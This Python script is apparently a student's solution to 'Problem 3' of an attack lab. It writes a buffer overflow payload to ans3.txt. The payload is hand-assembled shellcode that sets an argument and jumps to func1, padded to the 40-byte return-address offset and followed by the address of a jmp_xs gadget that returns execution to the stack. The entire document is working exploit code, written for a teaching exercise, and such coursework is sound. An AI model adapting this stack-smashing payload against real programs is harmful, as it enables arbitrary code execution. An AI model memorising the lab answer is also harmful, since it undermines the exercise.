import struct

# 1. Shellcode logic:
# mov edi, 0x72 (set first argument to 114)
# mov rax, 0x401216 (address of func1)
# jmp rax (execute func1)
shellcode = b"\xBF\x72\x00\x00\x00\x48\xC7\xC0\x16\x12\x40\x00\xFF\xE0"

# 2. Total offset to return address is 40 bytes
# (32 bytes buffer + 8 bytes saved rbp)
padding = shellcode + b"A" * (40 - len(shellcode))

# 3. Target gadget: <jmp_xs> at 0x401334
# This gadget jumps back to the start of our buffer on the stack
target_gadget = struct.pack("<Q", 0x401334)

# 4. Final payload
payload = padding + target_gadget

with open("ans3.txt", "wb") as f:
    f.write(payload)

print("Problem 3 Payload generated: ans3.txt")